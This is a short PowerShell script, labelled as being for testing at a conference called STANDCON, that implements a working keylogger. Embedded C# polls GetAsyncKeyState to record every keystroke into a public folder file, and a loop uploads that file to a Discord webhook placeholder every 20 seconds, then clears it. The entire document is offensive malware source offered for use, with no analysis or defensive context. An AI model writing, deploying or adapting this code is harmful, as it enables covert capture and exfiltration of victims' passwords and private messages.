#Keylogger Powershell Script
# For Testing - STANDCON

Add-Type -TypeDefinition @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
    public static void Start() {
        string path = "C:\\Users\\Public\\keylog.txt";
        while (true) {
            System.Threading.Thread.Sleep(100);
            for (int i = 8; i < 256; i++) {
                if (GetAsyncKeyState(i) == -32767) {
                    File.AppendAllText(path, ((char)i).ToString());
                }
            }
        }
    }
}
'@ -Language CSharp

Start-Job -ScriptBlock { [KeyLogger]::Start() }

while ($true) {
    if (Test-Path "C:\Users\Public\keylog.txt") {
        $logs = Get-Content "C:\Users\Public\keylog.txt" -Raw
        Invoke-RestMethod -Uri "<YOUR_DISCORD_WEBHOOK>" -Method Post -Body @{content=$logs}
        Clear-Content "C:\Users\Public\keylog.txt"
    }
    Start-Sleep -Seconds 20
}
